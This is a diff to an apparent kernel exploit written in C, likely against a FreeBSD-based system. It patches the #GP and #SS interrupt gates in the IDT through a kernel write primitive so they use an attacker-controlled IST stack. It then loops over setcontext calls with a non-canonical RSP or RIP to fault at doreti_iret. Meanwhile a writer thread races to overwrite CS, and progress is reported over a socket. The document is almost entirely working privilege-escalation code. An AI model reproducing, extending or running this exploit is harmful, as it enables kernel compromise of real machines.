@@ -4041,6 +4041,8 @@ broad_done:
         memset(ist_saved_percpu, 0, sizeof(ist_saved_percpu));
         int idt_gate_modified = 0;
         uint8_t idt_gate_saved[16];
+        int ss_gate_modified = 0;
+        uint8_t ss_gate_saved[16];
         int gp_ist_index = 0; /* which IST the #GP gate uses (0 = none) */
         int cpu_pinned = 0;
         int sigbus_installed = 0;
@@ -4405,8 +4407,13 @@ broad_done:
         send_response(sock, "  IST page PA=0x%lx, DMAP VA=0x%lx, stack top=0x%lx\n",
                       ist_page_pa, ist_dmap_va, ist_stack_top);
 
-        /* 7e. If #GP gate uses IST=0, patch it to use IST7 */
-        send_response(sock, "\n7e. Configuring IST for #GP...\n");
+        /* 7e. Patch #GP (vec 13) and #SS (vec 12) gates to use IST7.
+         *
+         * Non-canonical RIP during iretq → #GP(0).
+         * Non-canonical RSP during iretq → #SS(0) on AMD, #GP(0) on some.
+         * We patch BOTH gates so either fault vector uses our IST page.
+         */
+        send_response(sock, "\n7e. Configuring IST for #GP and #SS...\n");
         if (gp_ist_index == 0) {
             /* #GP gate has no IST — patch it to use IST7 */
             send_response(sock, "  #GP gate IST=0; patching to IST7\n");
@@ -4422,6 +4429,35 @@ broad_done:
             }
         } else {
             send_response(sock, "  #GP gate already uses IST%d\n", gp_ist_index);
+        }
+        /* Also patch #SS gate (vector 12) to use IST7 */
+        {
+            uint8_t ss_gate[16];
+            if (kernel_copyout(idt_access + 12 * 16, ss_gate, 16) == 0) {
+                int ss_ist = ss_gate[4] & 0x07;
+                uint64_t ss_handler =
+                    (uint64_t)ss_gate[0] |
+                    ((uint64_t)ss_gate[1] << 8) |
+                    ((uint64_t)ss_gate[6] << 16) |
+                    ((uint64_t)ss_gate[7] << 24) |
+                    ((uint64_t)ss_gate[8] << 32) |
+                    ((uint64_t)ss_gate[9] << 40) |
+                    ((uint64_t)ss_gate[10] << 48) |
+                    ((uint64_t)ss_gate[11] << 56);
+                send_response(sock, "  #SS gate: handler=0x%lx IST=%d type=0x%02x\n",
+                              ss_handler, ss_ist, ss_gate[5]);
+                if (ss_ist == 0) {
+                    memcpy(ss_gate_saved, ss_gate, 16);
+                    uint8_t new_ss_byte = (ss_gate[4] & 0xF8) | 7;
+                    kernel_setchar(idt_access + 12 * 16 + 4, new_ss_byte);
+                    ss_gate_modified = 1;
+                    send_response(sock, "  Patched #SS gate IST: 0 -> 7\n");
+                } else {
+                    send_response(sock, "  #SS gate already uses IST%d\n", ss_ist);
+                }
+            } else {
+                send_response(sock, "  WARNING: cannot read #SS gate\n");
+            }
         }
 
         /* Set the target IST entry on all per-CPU TSSes */
@@ -4562,15 +4598,22 @@ broad_done:
 
         /* 7i. Trigger loop
          *
-         * getcontext/setcontext form the loop: setcontext jumps back to
-         * getcontext's return point. The volatile global counter is
-         * incremented AFTER getcontext so it advances on every iteration
-         * (including setcontext-induced restores). sigsetjmp catches the
-         * signal handler's siglongjmp.
+         * Two strategies to fault at doreti_iret:
+         * A) Non-canonical RSP → #SS(0) on AMD, #GP(0) on some CPUs
+         * B) Non-canonical RIP → #GP(0)
+         *
+         * Both cause a fault AT the iretq instruction (doreti_iret).
+         * The IST-redirected exception handler uses our IST page;
+         * the writer thread races to overwrite CS with 0x43 so the
+         * kernel treats it as a user-mode fault and delivers a signal.
+         *
+         * If setcontext returns (kernel rejected the context), we
+         * retry in a while loop.  sigsetjmp catches the signal
+         * handler's siglongjmp on success.
          */
-        send_response(sock, "\n7i. Triggering iretq fault (up to 20 attempts)...\n");
+        send_response(sock, "\n7i. Triggering iretq fault (up to 50 attempts)...\n");
         {
-            int max_attempts = 20;
+            int max_attempts = 50;
             gp_trap_attempt_count = 0;
             gp_trap_sig_received = 0;
 
@@ -4586,29 +4629,49 @@ broad_done:
                               (uint64_t)gp_trap_mc_cs,
                               (uint64_t)gp_trap_mc_err);
             } else {
-                ucontext_t uc;
-                getcontext(&uc);
+                while (!gp_trap_got_result &&
+                       gp_trap_attempt_count < max_attempts) {
+                    ucontext_t uc;
+                    getcontext(&uc);
+                    gp_trap_attempt_count++;
 
-                /* Increment AFTER getcontext — this runs on every
-                 * entry, including setcontext-induced returns. */
-                gp_trap_attempt_count++;
+                    if (gp_trap_got_result)
+                        break;
 
-                if (!gp_trap_got_result &&
-                    gp_trap_attempt_count <= max_attempts) {
-
-                    if (gp_trap_attempt_count == 1 ||
-                        (gp_trap_attempt_count % 5) == 0) {
-                        send_response(sock, "  attempt %d...\n",
-                                      (int)gp_trap_attempt_count);
+                    const char *strategy;
+                    if (gp_trap_attempt_count <= 25) {
+                        /* Strategy A: non-canonical RSP.
+                         * Keep RIP valid; iretq faults loading RSP.
+                         * AMD: #SS(0), some CPUs: #GP(0). */
+                        uc.uc_mcontext.mc_rsp = 0x8000000000000000ULL;
+                        strategy = "non-canonical RSP";
+                    } else {
+                        /* Strategy B: non-canonical RIP.
+                         * iretq faults loading RIP → #GP(0). */
+                        uc.uc_mcontext.mc_rip = 0x8000000000000000ULL;
+                        strategy = "non-canonical RIP";
                     }
 
-                    uc.uc_mcontext.mc_rip = 0x8000000000000000ULL;
+                    if (gp_trap_attempt_count == 1 ||
+                        gp_trap_attempt_count == 26 ||
+                        (gp_trap_attempt_count % 10) == 0) {
+                        send_response(sock, "  attempt %d (%s)...\n",
+                                      (int)gp_trap_attempt_count, strategy);
+                    }
+
                     setcontext(&uc);
 
-                    /* setcontext returned — kernel rejected the context */
-                    send_response(sock, "  setcontext returned at attempt %d "
-                                  "(errno=%d)\n",
-                                  (int)gp_trap_attempt_count, errno);
+                    /* setcontext returned — kernel rejected the context.
+                     * Log first few failures per strategy. */
+                    if (gp_trap_attempt_count <= 2 ||
+                        gp_trap_attempt_count == 26 ||
+                        (gp_trap_attempt_count % 10) == 0) {
+                        send_response(sock, "  setcontext returned at "
+                                      "attempt %d (%s, errno=%d)\n",
+                                      (int)gp_trap_attempt_count,
+                                      strategy, errno);
+                    }
+                    usleep(100); /* yield briefly between retries */
                 }
             }
         }
@@ -4662,10 +4725,14 @@ broad_done:
                         }
                     }
                 }
-                /* Cleanup IDT gate */
+                /* Cleanup IDT gates */
                 if (idt_gate_modified) {
                     kernel_setchar(idt_access + 13 * 16 + 4, idt_gate_saved[4]);
                     idt_gate_modified = 0;
+                }
+                if (ss_gate_modified) {
+                    kernel_setchar(idt_access + 12 * 16 + 4, ss_gate_saved[4]);
+                    ss_gate_modified = 0;
                 }
                 /* Restore SIGBUS */
                 if (sigbus_installed) {
@@ -4750,10 +4817,14 @@ broad_done:
             }
         }
 
-        /* Restore IDT gate */
+        /* Restore IDT gates */
         if (idt_gate_modified) {
             kernel_setchar(idt_access + 13 * 16 + 4, idt_gate_saved[4]);
             send_response(sock, "  Restored #GP gate IST byte\n");
+        }
+        if (ss_gate_modified) {
+            kernel_setchar(idt_access + 12 * 16 + 4, ss_gate_saved[4]);
+            send_response(sock, "  Restored #SS gate IST byte\n");
         }
 
         /* Restore SIGBUS handler */
